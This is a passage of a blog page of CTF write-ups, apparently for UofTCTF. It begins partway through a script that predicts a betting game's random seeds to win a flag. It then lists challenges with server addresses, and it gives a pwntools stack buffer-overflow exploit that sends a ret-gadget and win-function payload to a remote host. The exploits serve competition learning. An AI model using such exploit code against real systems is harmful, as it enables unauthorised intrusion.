</span></span><span class=line><span class=cl>    <span class=c1># Wait for prompt after game loop</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Step 3: Win until rich</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>current_balance</span> <span class=o>&lt;</span> <span class=mi>10000</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># Predict next seed</span>
</span></span><span class=line><span class=cl>        <span class=n>next_server_seed</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>getrandbits</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># Calculate roll</span>
</span></span><span class=line><span class=cl>        <span class=n>roll</span> <span class=o>=</span> <span class=n>calculate_roll</span><span class=p>(</span><span class=n>next_server_seed</span><span class=p>,</span> <span class=n>client_seed</span><span class=p>,</span> <span class=n>nonce</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Predicted next roll (Nonce </span><span class=si>{</span><span class=n>nonce</span><span class=si>}</span><span class=s2>): </span><span class=si>{</span><span class=n>roll</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>min_wager</span> <span class=o>=</span> <span class=n>current_balance</span> <span class=o>/</span> <span class=mf>800.0</span>
</span></span><span class=line><span class=cl>        <span class=c1># Round min_wager up slightly to avoid float precision issues if server is strict</span>
</span></span><span class=line><span class=cl>        <span class=c1># But server uses `wager &lt; self.balance/800`</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>bet_amount</span> <span class=o>=</span> <span class=n>min_wager</span>
</span></span><span class=line><span class=cl>        <span class=n>greed</span> <span class=o>=</span> <span class=mi>98</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>roll</span> <span class=o>&lt;=</span> <span class=mi>98</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>bet_amount</span> <span class=o>=</span> <span class=n>current_balance</span>
</span></span><span class=line><span class=cl>            <span class=n>greed</span> <span class=o>=</span> <span class=nb>max</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>roll</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;WINNING OPPORTUNITY! Betting </span><span class=si>{</span><span class=n>bet_amount</span><span class=si>}</span><span class=s2> on </span><span class=si>{</span><span class=n>greed</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Losing roll. Betting minimum.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Execute bet</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send_line</span><span class=p>(</span><span class=s2>&#34;b&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=s2>&#34;Wager per game&#34;</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=s2>&#34;: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send_line</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>bet_amount</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=s2>&#34;Number of games (int): &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send_line</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=s2>&#34;Enter your number higher or equal to the roll&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send_line</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>greed</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=s2>&#34;Do you wish to proceed? (Y/N)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send_line</span><span class=p>(</span><span class=s2>&#34;Y&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># Read result</span>
</span></span><span class=line><span class=cl>        <span class=n>line</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>read_line</span><span class=p>()</span> <span class=c1># Game output</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>line</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=s2>&#34;Final Balance&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>line</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>read_line</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>line</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;Final Balance&#34;</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;Final Balance: ([\d\.]+)&#34;</span><span class=p>,</span> <span class=n>line</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=k>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>current_balance</span> <span class=o>=</span> <span class=nb>float</span><span class=p>(</span><span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;New Balance: </span><span class=si>{</span><span class=n>current_balance</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>nonce</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>current_balance</span> <span class=o>&gt;=</span> <span class=mi>10000</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Target balance reached!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Step 4: Buy Flag</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Step 4: Buying Flag...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send_line</span><span class=p>(</span><span class=s2>&#34;a&#34;</span><span class=p>)</span> <span class=c1># Shop</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send_line</span><span class=p>(</span><span class=s2>&#34;a&#34;</span><span class=p>)</span> <span class=c1># Buy flag</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Reading flag...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>line</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>read_line</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;OUTPUT LINE:&#34;</span><span class=p>,</span> <span class=n>line</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;uoftctf{&#34;</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;FLAG FOUND:&#34;</span><span class=p>,</span> <span class=n>line</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;options:&#34;</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span> <span class=c1># Back to menu</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>solve</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=uoft-lfsr-labyrinth--状态runningreproduction>UofT LFSR Labyrinth | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>A quirky 48-bit UofT stream taps through a WG-flavoured filter, leaving 80 bits of trace and a sealed flag. The blueprint is public; the hidden state is the dance you need to unravel.</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=mat247--状态runningreproduction>MAT247 | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>If V admits a T-cyclic vector, and ST=TS, show that S = p(T) for some polynomial T.</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=orca--状态runningreproduction>Orca | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>Orcas eat squids :(</p><p>​<code>nc 34.186.247.84 5000</code>​</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=rotor-cipher--状态runningreproduction>Rotor Cipher | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>We captured a rotor cipher, but they destroyed the rotors before we got to it. Can you recover the rotor wiring?</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=mat347--状态runningreproduction>MAT347 | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>Groups, Rings, and Fields. But only groups (and modules!).</p><p>​<code>nc 104.196.21.25 5000</code>​</p><p><strong>WriteUp</strong></p><p>暂无</p><h1 id=pwn>Pwn</h1><h2 id=baby-bof--状态solvedlive>Baby bof | 状态:solved｜Live</h2><p><strong>题目描述</strong></p><p>People said gets is not safe, but I think I figured out how to make it safe.</p><p>​<code>nc 34.48.173.44 5000</code>​</p><p><strong>WriteUp</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=s1>&#39;./chall&#39;</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>exe</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;34.48.173.44&#39;</span><span class=p>,</span> <span class=mi>5000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>exe</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>WIN</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;win&#39;</span><span class=p>]</span> <span class=c1># 0x4011F6</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>elf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>RET</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>&#39;ret&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>payload</span>  <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span>                     
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;B&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>  
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>RET</span><span class=p>)</span>                    
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>WIN</span><span class=p>)</span>                   
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;What is your name&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=extended-ebpf--状态runningreproduction>extended-eBPF | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>I extended the eBPF because its cool.</p><p>Note: You can log in as the ctf user</p><p>​<code>nc 34.26.243.6 5000</code>​</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=calculator--状态runningreproduction>Calculator | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>Look at this very simple calculator I implemented in c++.</p><p>​<code>nc 34.162.229.67 5000</code>​</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=uprobe--状态runningreproduction>uprobe | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>uprobes are cool</p><p>Note: You can log in as the ctf user</p><p>​<code>nc 136.107.76.27 5000</code>​</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=aes-aead-状态runningreproduction>AES AEAD| 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>We tried rolling our own crypto. What could possibly go wrong?</p><p>​<code>nc 35.185.46.39 5000</code>​</p><p><strong>WriteUp</strong></p><p>暂无</p></section><div class=comments><script>const getTheme=window.localStorage&&window.localStorage.getItem("theme");let theme=getTheme==="dark"?"dark":"light",s=document.createElement("script");s.src="https://giscus.app/client.js",s.setAttribute("data-repo","Wh1teJ0ker/discussion"),s.setAttribute("data-repo-id","R_kgDOOTzcZA"),s.setAttribute("data-category","Announcements"),s.setAttribute("data-category-id","DIC_kwDOOTzcZM4CoxXV"),s.setAttribute("data-mapping","pathname"),s.setAttribute("data-strict","0"),s.setAttribute("data-reactions-enabled","1"),s.setAttribute("data-emit-metadata","0"),s.setAttribute("data-input-position","top"),s.setAttribute("data-theme",theme),s.setAttribute("data-lang","zh-CN"),s.setAttribute("data-loading","lazy"),s.setAttribute("crossorigin","anonymous"),s.setAttribute("async",""),document.querySelector("div.comments").innerHTML="",document.querySelector("div.comments").appendChild(s)</script></div><div class=paginator><a class=next href=https://wh1tej0ker.github.io/post/2026newyearctf-22s8cc.html><span>2026NewYearCTF</span><svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375c0-.69413-.075800000000001-1.3284-.2422-1.86588M3.77086 21.1546C1.9934 20.7777.973585 18.7264 1.08749 16.688c.17931-3.209.06972-7.25665-.08236-10.47293C.87809 3.52811 3.12891 1.16316 5.51029 1.25008c4.25565.15534 9.86671-.04779 13.28091-.24466 1.2952-.074686 2.0494.62843 2.4005 1.76245M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787c1.918 1.4143 1.9383 9.65123 1.7087 13.59293-2.0526 7.6586-10.5943 7.3054-16.4004 5.705M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608 21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966 16.0174 11.8297 16.0154 11.9753 15.9494 12.0063 14.945 12.4779 13.0706 13.9264 12.055 15m3.5006-3.0333C13.1345 12.0608 8 12 6 11" stroke="currentcolor" stroke-linecap="round"/></svg></a></div></div></div></article></div><footer class=footer><p>&copy; 2026 <a href=https://wh1tej0ker.github.io/>Wh1teJ0kerのBlog</a>
Powered by
<a href=https://gohugo.io/ rel=noopener target=_blank>Hugo️️</a>
<a href=https://github.com/guangzhengli/hugo-theme-ladder rel=noopener target=_blank>Ladder</a>
️</p></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-up"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
</a><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const s=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';function n(){t.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-check"><polyline points="20 6 9 17 4 12"></polyline></svg>',setTimeout(()=>{t.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>'},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),n();return}const s=document.createRange();s.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(s);try{document.execCommand("copy"),n()}catch{}o.removeRange(s)}),e.parentNode.appendChild(t)})</script></main><div id=search-modal class=search-modal style=display:none><div class=search-modal-content><div class=search-input-wrapper><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
<input type=text id=search-input placeholder=搜索标题、标签或正文关键字 autocomplete=off>
<button type=button id=search-clear class=search-clear aria-label=清除搜索>
×
</button>
<span class=search-shortcut>ESC</span></div><div id=search-results class=search-results></div></div></div><style>#search-modal{position:fixed;inset:0;z-index:2000;display:none;background-color:rgba(15,23,42,.6);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);align-items:center;justify-content:center;padding:0 1.5rem}#search-modal.active{display:flex}#search-modal .search-modal-content{width:100%;max-width:880px;max-height:80vh;margin:0;background:0 0;box-shadow:none;border-radius:0;display:flex;flex-direction:column}[data-dark-mode] #search-modal .search-modal-content{background:0 0;border:none}</style></body><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2></script><script src=/main.min.80d50982893555370f4aacc2affcf405ae67515c8053bb96ae4aa69934f4efec7c58bde5638ac91af85238507fcc283a42df3e061b5b83554fd71d3c87979053.js integrity="sha512-gNUJgok1VTcPSqzCr/z0Ba5nUVyAU7uWrkqmmTT07+x8WL3lY4rJGvhSOFB/zCg6Qt8+Bhtbg1VP1x08h5eQUw==" crossorigin=anonymous defer></script></html>